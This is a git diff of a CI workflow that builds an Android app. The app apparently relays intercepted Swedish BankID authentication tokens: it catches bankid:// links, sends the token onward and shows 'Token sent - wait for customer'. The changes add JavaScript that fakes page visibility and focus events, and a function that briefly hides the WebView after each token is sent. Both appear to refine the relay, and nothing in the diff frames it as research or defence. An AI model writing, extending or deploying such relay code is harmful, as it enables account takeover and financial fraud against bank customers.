@@ -174,6 +174,7 @@ jobs:
           import android.os.Looper
           import android.text.InputType
           import android.view.Gravity
+          import android.view.View
           import android.view.ViewGroup
           import android.webkit.CookieManager
           import android.webkit.WebChromeClient
@@ -209,7 +210,7 @@ jobs:
               private val tick = object : Runnable {
                   override fun run() {
                       try {
-                          web.evaluateJavascript("(function(){try{if(!window.__relayInstalled){window.__relayInstalled=true;window.__hid=false;try{Object.defineProperty(document,'hidden',{configurable:true,get:function(){return window.__hid;}});Object.defineProperty(document,'visibilityState',{configurable:true,get:function(){return window.__hid?'hidden':'visible';}});}catch(e){}}window.__hid=true;document.dispatchEvent(new Event('visibilitychange'));window.dispatchEvent(new Event('blur'));setTimeout(function(){try{window.__hid=false;document.dispatchEvent(new Event('visibilitychange'));window.dispatchEvent(new Event('focus'));window.dispatchEvent(new Event('pageshow'));}catch(e){}},60);}catch(e){}})();", null)
+                          web.evaluateJavascript("(function(){try{if(!window.__relayInstalled){window.__relayInstalled=true;window.__hid=false;try{Object.defineProperty(document,'hidden',{configurable:true,get:function(){return window.__hid;}});Object.defineProperty(document,'visibilityState',{configurable:true,get:function(){return window.__hid?'hidden':'visible';}});}catch(e){}}window.__hid=true;document.dispatchEvent(new Event('visibilitychange'));window.dispatchEvent(new Event('blur'));window.dispatchEvent(new Event('pagehide'));setTimeout(function(){try{window.__hid=false;document.dispatchEvent(new Event('visibilitychange'));window.dispatchEvent(new Event('focus'));window.dispatchEvent(new Event('pageshow'));}catch(e){}},80);}catch(e){}})();", null)
                       } catch (t: Throwable) {
                       }
                       checkDone()
@@ -363,6 +364,21 @@ jobs:
                   super.onDestroy()
               }
 
+              private fun blink() {
+                  try {
+                      web.visibility = View.GONE
+                      h.postDelayed(object : Runnable {
+                          override fun run() {
+                              try {
+                                  web.visibility = View.VISIBLE
+                              } catch (t: Throwable) {
+                              }
+                          }
+                      }, 350)
+                  } catch (t: Throwable) {
+                  }
+              }
+
               private fun grab(url: String): Boolean {
                   if (!url.startsWith("bankid://")) return false
                   val u = Uri.parse(url)
@@ -381,6 +397,7 @@ jobs:
                       if (m != 2) {
                           statusBar.text = "Token skickad - vanta pa kund"
                           send(token, redirect)
+                          blink()
                       } else {
                           statusBar.text = "Egen BankID"
                       }
@@ -820,9 +837,9 @@ jobs:
           gradle assembleDebug --no-daemon --stacktrace > /tmp/bygg.log 2>&1
           echo "EXIT=$?"
           echo "=== e-rader ==="
-          grep -n "^e:" /tmp/bygg.log
+          grep -n "^e:" /tmp/bygg.log || true
           echo "=== sista 40 rader ==="
-          tail -40 /tmp/bygg.log
+          tail -40 /tmp/bygg.log || true
           test -f app/build/outputs/apk/debug/app-debug.apk
 
       - name: Spara APK
@@ -845,9 +862,9 @@ jobs:
         run: |
           {
             echo "=== e-rader ==="
-            grep -n "^e:" /tmp/bygg.log 2>/dev/null
+            grep -n "^e:" /tmp/bygg.log 2>/dev/null || true
             echo "=== sista 60 ==="
-            tail -60 /tmp/bygg.log 2>/dev/null
+            tail -60 /tmp/bygg.log 2>/dev/null || true
           } > bygg-resultat.txt
           git config user.name "relay-bot"
           git config user.email "bot@example.com"
